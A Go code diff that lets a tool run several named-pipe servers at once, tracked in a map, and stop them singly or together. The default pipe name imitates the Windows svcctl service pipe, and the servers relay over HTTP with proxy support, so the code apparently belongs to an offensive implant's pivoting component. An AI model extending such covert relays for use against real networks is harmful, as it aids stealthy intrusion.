@@ -71,20 +71,26 @@ type pipeServer struct {
 }
 
 var (
-	globalPS   *pipeServer
-	globalPSMu sync.Mutex
+	globalPipes   = map[string]*pipeServer{} // pipeName → server
+	globalPipesMu sync.Mutex
 )
 
-func startPipeServer(pipeName string) error {
+func normPipeName(pipeName string) string {
 	if pipeName == "" {
-		pipeName = `\\.\pipe\svcctl`
-	} else if len(pipeName) < 9 || pipeName[:9] != `\\.\pipe\` {
-		pipeName = `\\.\pipe\` + pipeName
+		return `\\.\pipe\svcctl`
 	}
-	globalPSMu.Lock()
-	defer globalPSMu.Unlock()
-	if globalPS != nil {
-		return fmt.Errorf("pipe server already running on %s", globalPS.pipeName)
+	if len(pipeName) < 9 || pipeName[:9] != `\\.\pipe\` {
+		return `\\.\pipe\` + pipeName
+	}
+	return pipeName
+}
+
+func startPipeServer(pipeName string) error {
+	pipeName = normPipeName(pipeName)
+	globalPipesMu.Lock()
+	defer globalPipesMu.Unlock()
+	if _, exists := globalPipes[pipeName]; exists {
+		return fmt.Errorf("pipe server already running on %s", pipeName)
 	}
 	tr := &http.Transport{}
 	if ProxyURL != "" {
@@ -98,29 +104,48 @@ func startPipeServer(pipeName string) error {
 		client:    &http.Client{Transport: tr, Timeout: 30 * time.Second},
 		stop:      make(chan struct{}),
 	}
-	globalPS = ps
+	globalPipes[pipeName] = ps
 	go ps.run()
 	return nil
 }
 
-func stopPipeServer() string {
-	globalPSMu.Lock()
-	defer globalPSMu.Unlock()
-	if globalPS == nil {
-		return "no pipe server running"
+// stopPipeServer stops a specific pipe server by name, or all if pipeName is "".
+func stopPipeServer(pipeName string) string {
+	globalPipesMu.Lock()
+	defer globalPipesMu.Unlock()
+
+	doStop := func(ps *pipeServer) {
+		ps.once.Do(func() {
+			close(ps.stop)
+			ps.mu.Lock()
+			if ps.lh != 0 {
+				procCancelIoEx.Call(uintptr(ps.lh), 0)
+			}
+			ps.mu.Unlock()
+		})
 	}
-	ps := globalPS
-	globalPS = nil
-	ps.once.Do(func() {
-		close(ps.stop)
-		// CancelIoEx unblocks the blocking ConnectNamedPipe call
-		ps.mu.Lock()
-		if ps.lh != 0 {
-			procCancelIoEx.Call(uintptr(ps.lh), 0)
+
+	if pipeName == "" {
+		if len(globalPipes) == 0 {
+			return "no pipe servers running"
 		}
-		ps.mu.Unlock()
-	})
-	return fmt.Sprintf("[+] pipe server on %s stopped", ps.pipeName)
+		names := make([]string, 0, len(globalPipes))
+		for name, ps := range globalPipes {
+			doStop(ps)
+			names = append(names, name)
+		}
+		globalPipes = map[string]*pipeServer{}
+		return fmt.Sprintf("[+] stopped %d pipe server(s): %v", len(names), names)
+	}
+
+	pipeName = normPipeName(pipeName)
+	ps, ok := globalPipes[pipeName]
+	if !ok {
+		return fmt.Sprintf("no pipe server running on %s", pipeName)
+	}
+	doStop(ps)
+	delete(globalPipes, pipeName)
+	return fmt.Sprintf("[+] pipe server on %s stopped", pipeName)
 }
 
 func (ps *pipeServer) run() {
